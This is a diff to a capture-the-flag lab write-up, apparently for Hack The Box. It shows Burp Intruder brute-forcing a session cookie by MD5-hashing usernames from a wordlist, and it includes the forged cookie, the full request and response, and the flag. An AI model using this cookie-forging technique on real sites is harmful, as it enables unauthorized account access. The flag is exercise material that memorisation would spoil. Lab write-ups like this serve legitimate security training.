@@ -356,10 +356,65 @@ now set this encoding/hashing syntax  in burp intruder
 1) add cookie parameter as payload  (cookie=$ $ )
 2) select attack: sniper attack , payload type: simple list
 3) load '/usr/share/seclists/Usernames/top-usernames-shortlist.txt'
-4) in payload processing set this flow ==string > MD5 Hash > ASCII HEX encoding > cookie=== 
+4) in payload processing set this flow ==string > MD5 Hash  > cookie== 
 
-![[Screenshot From 2025-04-06 12-32-59.png]]
+![[Screenshot From 2025-04-06 14-22-49.png]]
 ![[Screenshot From 2025-04-06 12-33-21.png]]
 
-----
 
+
+start the attack , this cookie `cookie=ee11cbb19052e40b07aac0ca060c23ee` will get the flag
+
+```
+GET /skills/ HTTP/1.1
+Host: 94.237.63.165:57248
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: cookie=ee11cbb19052e40b07aac0ca060c23ee
+Connection: keep-alive
+
+
+```
+
+```
+HTTP/1.1 200 OK
+Date: Sun, 06 Apr 2025 08:52:00 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Set-Cookie: cookie=084e0343a0486ff05530df6c705c8bb4
+Vary: Accept-Encoding
+Content-Length: 450
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome</title>
+
+</head>
+
+<body style="background-color: #141d2b; font-family: sans-serif; color: white;">
+    <center>
+                    <div class='control'>
+                <h1>
+                    Welcome Back user
+                </h1>
+            </div>
+            <br><br>
+            HTB{fuzz1n6_my_f1r57_c00k13}
+                    </center>
+</body>
+
+</html>
+```
+
+Note :
+you can click on "View filter" and  ![[Screenshot From 2025-04-06 14-25-43.png]]
